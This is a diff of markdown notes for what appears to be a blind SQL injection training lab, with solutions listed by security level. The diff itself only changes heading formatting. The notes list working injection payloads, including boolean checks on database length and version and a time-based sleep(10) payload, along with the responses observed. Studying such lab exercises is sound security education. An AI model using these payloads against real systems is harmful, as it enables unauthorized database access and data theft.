@@ -2,7 +2,7 @@ Blind SQL injections rely on finding
 implicit true/false outputs based on input
 to find vulnerabilities.
 
-Low:
+### Security level: LOW
 
 * Solution 1: 1' and length(database())=4#
 * Solution 2: 1' and version();#
@@ -11,10 +11,10 @@ This is a indirect way of saying there are only 2 columns
 * Anything other than 1' and length(database())=4# will result in 
 the missing error because there are exactly 4 IDs.
 
-Medium:
+### Security level: MEDIUM
 * Solution 1: 1 and length(database())=4#
 * Solution 2: 1 and version();#
 
-High:
+### Security level: HIGH
 * Solution: 1' and sleep(10)#
 * Recieved "User ID is MISSING from the database" after 10 seconds, meaning it worked.
